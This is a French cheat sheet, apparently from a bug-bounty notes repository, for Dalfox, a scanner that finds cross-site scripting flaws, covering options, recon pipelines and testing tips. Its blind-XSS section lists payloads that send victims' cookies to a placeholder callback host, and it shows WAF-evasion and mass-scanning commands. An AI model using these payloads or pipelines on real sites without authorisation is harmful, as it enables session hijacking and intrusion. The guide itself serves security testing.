# 🦊 Dalfox — framework de détection des XSS

<!-- language-home-navigation -->
[🏠 Accueil en français](../../README.fr.md) • [🌐 Languages](../../README.md#-available-languages)

```
  ██████╗  █████╗ ██╗     ███████╗ ██████╗ ██╗  ██╗
  ██╔══██╗██╔══██╗██║     ██╔════╝██╔═══██╗╚██╗██╔╝
  ██║  ██║███████║██║     █████╗  ██║   ██║ ╚███╔╝ 
  ██║  ██║██╔══██║██║     ██╔══╝  ██║   ██║ ██╔██╗ 
  ██████╔╝██║  ██║███████╗██║     ╚██████╔╝██╔╝ ██╗
  ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝      ╚═════╝ ╚═╝  ╚═╝
         Powerful XSS Scanner & Analysis Tool
```

<p align="center">
  <img src="https://img.shields.io/badge/Dalfox-XSS_Scanner-blue?style=for-the-badge" alt="Dalfox">
  <img src="https://img.shields.io/badge/Reflected_XSS-green?style=for-the-badge" alt="Reflected">
  <img src="https://img.shields.io/badge/Bug_Bounty-red?style=for-the-badge" alt="Bug Bounty"><br>
  <a href="README.tr.md">🇹🇷 Türkçe Sürüm</a> • <a href="README.el.md">🇬🇷 Ελληνικά</a>
</p>

---

> **Versions et lecture :** cette fiche conserve les exemples de la version Go du document source ; sous-commandes, options et formats peuvent évoluer. Consultez la [référence officielle de la CLI](https://dalfox.hahwul.com/reference/cli/). Dans les analyses, `-p` sélectionne un paramètre : ce n’est pas une option permettant de fournir directement une charge utile. `--custom-payload` désigne un fichier. Les commandes originales restent inchangées.
>
> **Précisions :** `--skip-mining` désactive la recherche de paramètres ; il ne signifie pas ignorer une empreinte. Voir la [documentation des paramètres](https://dalfox.hahwul.com/guide/parameters/). L’exemple serveur choisit le port `8080`, puis montre une requête vers `8090` : ces valeurs sources ne correspondent pas. Les adresses de rappel doivent appartenir à un service réellement configuré ; une interaction ou une réflexion demande une interprétation dans son contexte. Le dessin ASCII conserve le texte source.

## 📋 Table des matières

- [Qu’est-ce que Dalfox](#-quest-ce-que-dalfox)
- [Installation](#-installation)
- [Utilisation de base](#-utilisation-de-base)
- [Modes d’analyse](#-modes-danalyse)
- [Options avancées](#-options-avancées)
- [XSS aveugles (Blind XSS)](#-xss-aveugles-blind-xss)
- [Référence rapide](#-référence-rapide)

---

## 🎯 Qu’est-ce que Dalfox

**Dalfox** est un outil de détection et d’analyse des vulnérabilités XSS :

- 🔍 **Analyse des paramètres** — Repérer les points où les données sont réinjectées dans la réponse
- 🎯 **Détection des XSS** — XSS réfléchies et fondées sur le DOM
- 💉 **XSS aveugles (Blind XSS)** — Tests hors bande
- ⚡ **Rapide** — Version Go du document source, avec un fort parallélisme

### Pourquoi Dalfox ?

| Fonctionnalité | Avantage |
|---------|---------|
| Analyse contextuelle | Charges utiles adaptées au contexte |
| Détection des WAF | Contournements de WAF courants selon la source |
| XSS aveugles | Prise en charge des interactions hors bande (OOB) |
| Recherche de paramètres (mining) | Rechercher des paramètres dans le JavaScript selon la source |

---

## 🚀 Installation

```bash
# Installation avec Go (recommandée)
go install github.com/hahwul/dalfox/v2@latest

# Homebrew (macOS)
brew install dalfox

# Snap (Linux)
sudo snap install dalfox

# Vérifier
dalfox version
```

---

## 📖 Utilisation de base

### Une seule URL

```bash
# Analyse de base
dalfox url https://example.com/search?q=test

# Enregistrer la sortie
dalfox url https://example.com/search?q=test -o results.txt
```

### Plusieurs URL

```bash
# Depuis l’entrée standard
cat urls.txt | dalfox pipe

# Depuis un fichier
dalfox file urls.txt

# Avec parallélisme
cat urls.txt | dalfox pipe -w 50
```

### Mode silencieux

```bash
# Afficher uniquement les vulnérabilités selon le libellé source
dalfox url https://example.com/search?q=test --silence

# Sans couleur
dalfox url https://example.com/search?q=test --no-color
```

---

## 🔎 Modes d’analyse

### Mode URL

```bash
# Analyser une seule URL
dalfox url https://example.com/page?param=value

# Analyser avec des données
dalfox url https://example.com/page?param=value -d "post_param=value"
```

### Mode pipeline (pipe)

```bash
# Depuis l’entrée standard
echo "https://example.com/search?q=test" | dalfox pipe

# Plusieurs URL
cat urls_with_params.txt | dalfox pipe
```

### Mode fichier (file)

```bash
# Depuis un fichier
dalfox file urls.txt

# Avec fichier de sortie
dalfox file urls.txt -o results.txt
```

### Mode serveur (server)

```bash
# Démarrer le serveur d’API
dalfox server

# Port personnalisé
dalfox server -p 8080

# Envoyer ensuite les requêtes indiquées :
# POST http://localhost:8090/scan
# {"url": "https://example.com/search?q=test"}
```

---

<a id="-options-avancées"></a>
## ⚙️ Options avancées

### En-têtes personnalisés

```bash
# Ajouter un en-tête
dalfox url https://example.com/search?q=test -H "Authorization: Bearer token"

# Plusieurs en-têtes
dalfox url https://example.com/search?q=test \
  -H "Cookie: session=abc" \
  -H "X-Forwarded-For: 127.0.0.1"
```

### Cookie et authentification

```bash
# Avec un cookie
dalfox url https://example.com/search?q=test -C "session=abc123"

# Authentification HTTP Basic
dalfox url https://example.com/search?q=test --basic-auth "user:pass"
```

### Charges utiles personnalisées (payloads)

```bash
# Utiliser un fichier de charges utiles personnalisées
dalfox url https://example.com/search?q=test --custom-payload payloads.txt

# Charge utile unique selon le libellé source ; voir la précision sur -p
dalfox url https://example.com/search?q=test -p '<script>alert(1)</script>'

# Format des charges utiles dans le fichier :
# <script>alert(1)</script>
# <img src=x onerror=alert(1)>
# <svg onload=alert(1)>
```

### Formats de sortie

```bash
# Sortie JSON
dalfox url https://example.com/search?q=test --format json -o result.json

# Seulement les vulnérabilités selon le libellé source
dalfox url https://example.com/search?q=test --only-poc
```

### Performances

```bash
# Définir le nombre de workers (parallélisme)
dalfox url https://example.com/search?q=test -w 100

# Délai d’attente, en secondes
dalfox url https://example.com/search?q=test --timeout 10

# Délai entre les requêtes, en millisecondes
dalfox url https://example.com/search?q=test --delay 100
```

### Évasion des WAF

```bash
# Utiliser le mode d’évasion des WAF
dalfox url https://example.com/search?q=test --waf-evasion

# Ignorer l’empreinte selon le libellé source ; voir la précision sur --skip-mining
dalfox url https://example.com/search?q=test --skip-mining
```

### Proxy

```bash
# Proxy HTTP
dalfox url https://example.com/search?q=test --proxy http://127.0.0.1:8080

# Pour Burp Suite
dalfox url https://example.com/search?q=test --proxy http://127.0.0.1:8080
```

---

## 💉 XSS aveugles (Blind XSS)

### Utiliser une charge utile de XSS aveugle

```bash
# Avec XSS Hunter ou Burp Collaborator
dalfox url https://example.com/form?input=test -b "https://your.xss.ht"

# L’option -b ajoute des rappels de XSS aveugle
```

### XSS aveugle avec une charge utile personnalisée

```bash
# Charge utile personnalisée pour XSS aveugle
dalfox url https://example.com/form?name=test \
  --blind "https://your.xss.ht" \
  --custom-payload blind_payloads.txt
```

### Exemples de charges utiles pour XSS aveugle

```html
"><img src=x onerror="fetch('https://your.xss.ht/'+document.cookie)">
"><script src="https://your.xss.ht"></script>
'"><script>new Image().src="https://your.xss.ht/?c="+document.cookie</script>
```

---

## 📊 Référence rapide

### Commandes de base

| Commande | Description |
|---------|-------------|
| `dalfox url URL` | Analyser une seule URL |
| `dalfox file file.txt` | Analyser depuis un fichier |
| `cat urls \| dalfox pipe` | Analyser depuis l’entrée standard |
| `dalfox server` | Démarrer le serveur d’API |

### Options essentielles

| Option | Description |
|------|-------------|
| `-o file.txt` | Fichier de sortie |
| `-w 50` | Workers (parallélisme) |
| `-H "Header: value"` | En-tête personnalisé |
| `-C "cookie=value"` | Cookie |
| `-b "url"` | Adresse de rappel pour XSS aveugle |
| `--proxy URL` | Proxy HTTP |
| `--timeout 10` | Délai d’attente des requêtes |

### Options de sortie

| Option | Description |
|------|-------------|
| `--format json` | Sortie JSON |
| `--only-poc` | Afficher uniquement les preuves de concept (PoC) |
| `--silence` | Mode silencieux |
| `--no-color` | Sortie sans couleurs |

### Options de charges utiles

| Option | Description |
|------|-------------|
| `-p "payload"` | Charge utile selon le libellé source ; voir la précision sur -p |
| `--custom-payload file` | Fichier de charges utiles |
| `--waf-evasion` | Mode d’évasion des WAF |

---

## 🎯 Déroulements de tests en bug bounty

### Analyse XSS de base

```bash
# Analyse rapide
dalfox url "https://target.com/search?q=test" --silence
```

### À partir d’une collecte d’URL

```bash
# GAU et Dalfox
gau target.com | grep "=" | dalfox pipe -o xss_results.txt

# Wayback et Dalfox
echo target.com | waybackurls | grep "=" | dalfox pipe --silence
```

### Analyse d’un ensemble d’URL

```bash
# Analyser tous les paramètres des URL
cat all_urls.txt | grep "?" | dalfox pipe -w 100 -o found_xss.txt
```

### Avec les motifs GF

```bash
# Avec GF et Dalfox
gau target.com | gf xss | dalfox pipe --silence

# Avec un filtre httpx
gau target.com | gf xss | httpx -silent | dalfox pipe
```

### Analyse authentifiée

```bash
# Avec une session
dalfox url "https://target.com/dashboard?search=test" \
  -C "session=abc123" \
  -H "Authorization: Bearer token" \
  -o auth_xss.txt
```

### Pipeline complet

```bash
# Pipeline complet de recherche de XSS
subfinder -d target.com -silent | \
  httpx -silent | \
  gau | \
  gf xss | \
  uro | \
  dalfox pipe -w 50 --silence -o xss_vulnerabilities.txt
```

### Campagne de XSS aveugles

```bash
# XSS aveugles sur plusieurs URL
cat contact_forms.txt | dalfox pipe -b "https://your.xss.ht" --silence

# Pour les formulaires de saisie en particulier
cat form_urls.txt | dalfox pipe \
  -b "https://your.xss.ht" \
  --custom-payload blind_xss.txt \
  -w 10
```

---

## 💡 Conseils pour rechercher des XSS

1. **Examiner tous les paramètres** — Pas seulement les plus évidents
2. **Tester plusieurs contextes** — HTML, JavaScript et attributs
3. **Utiliser les XSS aveugles** — Pour les panneaux d’administration et les journaux
4. **Étudier les enchaînements avec une redirection ouverte** — Pour évaluer les conséquences possibles
5. **Examiner les en-têtes de réponse** — CSP, X-XSS-Protection
6. **Tester les paramètres POST** — Souvent oubliés

### Points d’injection XSS courants

```
- Champs de recherche
- Champs des profils utilisateurs
- Commentaires et retours
- Paramètres d’URL
- En-têtes HTTP (Referer, User-Agent)
- Noms des fichiers téléversés
- Messages d’erreur
```

### Charges utiles propres au contexte

| Contexte | Charge utile |
|---------|---------|
| HTML | `<script>alert(1)</script>` |
| Attribut | `" onmouseover="alert(1)"` |
| JavaScript | `';alert(1)//` |
| URL | `javascript:alert(1)` |

---

## 📚 Ressources

- [Dalfox GitHub](https://github.com/hahwul/dalfox)
- [Charges utiles XSS](https://github.com/payloadbox/xss-payload-list)

### Fiches connexes
- [Méthodologie de bug bounty](../../Bug-Bounty-Methodology/translations/README.fr.md)
- [Charges utiles XSS](../../Payloads/XSS.md)
- [Burp Suite](../../Burp-Suite/translations/README.fr.md)

---

<p align="center">
  <b>🦊 Recherchez les vulnérabilités XSS !</b><br>
  <i>Dalfox — Un allié pour la recherche de XSS</i>
</p>
